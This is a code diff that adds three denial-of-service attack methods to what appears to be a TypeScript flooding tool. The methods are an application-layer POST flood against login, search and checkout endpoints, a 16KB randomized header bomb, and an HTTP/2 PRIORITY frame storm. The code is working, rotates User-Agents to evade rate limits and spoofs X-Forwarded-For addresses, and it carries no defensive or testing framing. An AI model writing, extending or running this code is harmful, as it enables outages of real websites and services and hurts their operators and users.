@@ -4058,6 +4058,257 @@ async function runKeepaliveExhaust(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  APP SMART FLOOD — POST to high-cost endpoints, forces DB query per req
+// ─────────────────────────────────────────────────────────────────────────
+const SMART_ENDPOINTS = [
+  "/login", "/signin", "/auth/login",
+  "/search", "/api/search", "/api/v1/search", "/api/v2/search",
+  "/checkout", "/cart/checkout", "/order/submit",
+  "/register", "/signup", "/auth/register",
+  "/api/users", "/api/products", "/api/orders",
+  "/api/products/search", "/api/items/search",
+  "/api/v1/auth/login", "/api/v2/checkout",
+  "/account/login", "/user/login",
+];
+
+async function runAppSmartFlood(
+  base: string,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+) {
+  let localPkts = 0, localBytes = 0;
+  const flushIv = setInterval(() => {
+    if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
+  }, 500);
+
+  const buildSmartBody = () => {
+    const username  = randStr(8);
+    const password  = randStr(12);
+    const email     = `${randStr(6)}@${randStr(4)}.com`;
+    const query     = randStr(randInt(4, 16));
+    const price     = (Math.random() * 999 + 1).toFixed(2);
+    const productId = randInt(1, 999999);
+    const userId    = randInt(1, 999999);
+    // rotate body format: JSON (60%) or form-encoded (40%)
+    if (Math.random() < 0.6) {
+      const obj: Record<string, unknown> = {
+        username, password, email, query,
+        price, product_id: productId, user_id: userId,
+        _t: Date.now(), _r: randStr(8),
+        filters: { category: randStr(6), min_price: 0, max_price: price },
+        page: randInt(1, 100), per_page: randInt(10, 100),
+      };
+      return JSON.stringify(obj);
+    }
+    return `username=${username}&password=${password}&email=${encodeURIComponent(email)}&q=${query}&page=${randInt(1, 100)}&_t=${Date.now()}&_r=${randStr(8)}`;
+  };
+
+  const doRequest = async () => {
+    const endpoint = SMART_ENDPOINTS[randInt(0, SMART_ENDPOINTS.length)];
+    const url      = `${base}${endpoint}`;
+    const body     = buildSmartBody();
+    const isJson   = body.startsWith("{");
+    const h        = buildHeaders(true, body.length);
+    h["Content-Type"] = isJson ? "application/json" : "application/x-www-form-urlencoded";
+    h["Cache-Control"] = "no-cache, no-store";
+    h["Pragma"]        = "no-cache";
+    // Vary UA and endpoint to bypass per-endpoint rate limits
+    h["User-Agent"] = randUA();
+    try {
+      const res = await fetch(url, {
+        method: "POST",
+        headers: h,
+        body,
+        signal: AbortSignal.timeout(8000),
+      });
+      await res.body?.cancel();
+      localPkts++;
+      localBytes += body.length + 300;
+    } catch { /* target not accepting — expected */ }
+  };
+
+  const runSlot = async () => {
+    while (!signal.aborted) {
+      await doRequest();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(5, 25)));
+    }
+  };
+  await Promise.all(Array.from({ length: Math.max(50, threads) }, runSlot));
+  clearInterval(flushIv);
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  LARGE HEADER BOMB — 16KB randomized headers exhaust HTTP parser alloc
+// ─────────────────────────────────────────────────────────────────────────
+async function runLargeHeaderBomb(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number, c?: number) => void,
+) {
+  const isHttps = targetPort === 443;
+  let localPkts = 0, localBytes = 0, localConns = 0;
+  const flushIv = setInterval(() => {
+    if (localPkts > 0) { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; }
+  }, 500);
+
+  // Build a 16KB header block with randomized X-* headers
+  const buildBigHeaders = () => {
+    const lines: string[] = [];
+    // target ~16KB total header block
+    while (lines.join("\r\n").length < 16 * 1024) {
+      const name  = `X-${randStr(randInt(8, 20))}`;
+      const value = randStr(randInt(30, 80));
+      lines.push(`${name}: ${value}`);
+    }
+    return lines.join("\r\n");
+  };
+
+  const oneConn = () => new Promise<void>(resolve => {
+    const bigHeaders = buildBigHeaders();
+    const path       = hotPath();
+    const reqLine    = `GET ${path}?_=${Date.now()} HTTP/1.1\r\n`;
+    const mandatory  = [
+      `Host: ${hostname}`,
+      `User-Agent: ${randUA()}`,
+      `Accept: */*`,
+      `Connection: close`,
+      `X-Forwarded-For: ${randInt(1,255)}.${randInt(0,255)}.${randInt(0,255)}.${randInt(0,255)}`,
+    ].join("\r\n");
+    const payload    = Buffer.from(`${reqLine}${mandatory}\r\n${bigHeaders}\r\n\r\n`);
+
+    const done = () => { localConns = Math.max(0, localConns - 1); resolve(); };
+    const sock: net.Socket | tls.TLSSocket = isHttps
+      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+      : net.connect({ host: resolvedHost, port: targetPort });
+
+    const onConn = () => {
+      localConns++;
+      sock.write(payload, () => {
+        localPkts++;
+        localBytes += payload.length;
+      });
+      setTimeout(done, 3000);
+    };
+
+    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
+    else          sock.once("connect", onConn);
+    sock.on("data",    () => {});
+    sock.on("error",   done);
+    sock.on("close",   done);
+    sock.setTimeout(8000);
+    sock.on("timeout", done);
+    signal.addEventListener("abort", done, { once: true });
+  });
+
+  const runSlot = async () => {
+    while (!signal.aborted) {
+      await oneConn();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(10, 40)));
+    }
+  };
+  await Promise.all(Array.from({ length: Math.max(30, threads) }, runSlot));
+  clearInterval(flushIv); onStats(localPkts, localBytes, localConns);
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  HTTP/2 PRIORITY STORM — PRIORITY frames rebuild stream dependency tree
+//  RFC 7540 §6.3 — each PRIORITY frame forces server to re-sort tree
+// ─────────────────────────────────────────────────────────────────────────
+async function runH2PriorityStorm(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+) {
+  // PRIORITY frame: type=0x2, 5 bytes payload
+  // Payload: [E][stream_dep 31bits][weight 8bits]
+  // Sending thousands/sec with random stream IDs forces server to rebuild
+  // its entire stream priority tree on every frame.
+  const buildPriorityFrame = (streamId: number) => {
+    const frame     = Buffer.allocUnsafe(9 + 5);
+    const depStream = randInt(1, 0x7fffffff) & ~0x80000000;
+    const weight    = randInt(0, 255);
+    // Frame header
+    frame.writeUInt16BE(0, 0);   // length hi
+    frame.writeUInt8(5, 2);      // length lo = 5
+    frame.writeUInt8(0x2, 3);    // type = PRIORITY
+    frame.writeUInt8(0x0, 4);    // flags = 0
+    frame.writeUInt32BE(streamId & 0x7fffffff, 5);
+    // Payload
+    frame.writeUInt32BE(depStream, 9);
+    frame.writeUInt8(weight, 13);
+    return frame;
+  };
+
+  const H2_PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+  const H2_SETTINGS = Buffer.from([
+    0,0,0x0c, 0x4,0x0, 0,0,0,0,
+    0x0,0x3, 0,0,0x00,0x64,  // MAX_CONCURRENT_STREAMS=100
+    0x0,0x4, 0x00,0xFF,0xFF,0xFF, // INITIAL_WINDOW_SIZE=max
+  ]);
+
+  let localPkts = 0, localBytes = 0;
+  const flushIv = setInterval(() => {
+    if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
+  }, 500);
+
+  const oneConn = () => new Promise<void>(resolve => {
+    const done = () => resolve();
+    const sock: tls.TLSSocket = tls.connect({
+      host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false,
+      ALPNProtocols: ["h2"],
+    });
+
+    sock.once("secureConnect", () => {
+      if (signal.aborted) { sock.destroy(); return done(); }
+      sock.write(H2_PREFACE);
+      sock.write(H2_SETTINGS);
+
+      let streamId = 1;
+      // Send burst of PRIORITY frames as fast as possible
+      // 200 frames per burst × every 3ms = ~66K frames/sec per conn
+      const iv = setInterval(() => {
+        if (signal.aborted || sock.destroyed) { clearInterval(iv); return done(); }
+        const frames = Buffer.concat(
+          Array.from({ length: 200 }, () => {
+            const f = buildPriorityFrame(streamId);
+            streamId = (streamId + 2) % 0x7ffffffe || 1;
+            return f;
+          })
+        );
+        sock.write(frames);
+        localPkts += 200;
+        localBytes += frames.length;
+      }, 3);
+
+      setTimeout(() => { clearInterval(iv); sock.destroy(); done(); }, 30_000);
+    });
+
+    sock.on("data",    () => {});
+    sock.on("error",   done);
+    sock.on("close",   done);
+    sock.setTimeout(35_000);
+    sock.on("timeout", done);
+    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
+  });
+
+  const runSlot = async () => {
+    while (!signal.aborted) {
+      await oneConn();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 200));
+    }
+  };
+  await Promise.all(Array.from({ length: Math.max(10, threads) }, runSlot));
+  clearInterval(flushIv); onStats(localPkts, localBytes);
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  WORKER MAIN — receives config, runs attack, posts stats
 // ─────────────────────────────────────────────────────────────────────────
 const cfg = workerData as WorkerConfig;
@@ -4232,6 +4483,18 @@ async function runWorker() {
   } else if (cfg.method === "keepalive-exhaust") {
     // Keepalive Exhaust — pipeline 128 requests per keep-alive connection, holds worker threads
     await runKeepaliveExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "app-smart-flood") {
+    // App Smart Flood — POST to /login /search /checkout forcing DB queries, uncacheable
+    await runAppSmartFlood(base, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "large-header-bomb") {
+    // Large Header Bomb — 16KB randomized headers exhaust HTTP parser allocator
+    await runLargeHeaderBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "http2-priority-storm") {
+    // H2 PRIORITY Storm — PRIORITY frames force server to rebuild stream dependency tree per frame
+    await runH2PriorityStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
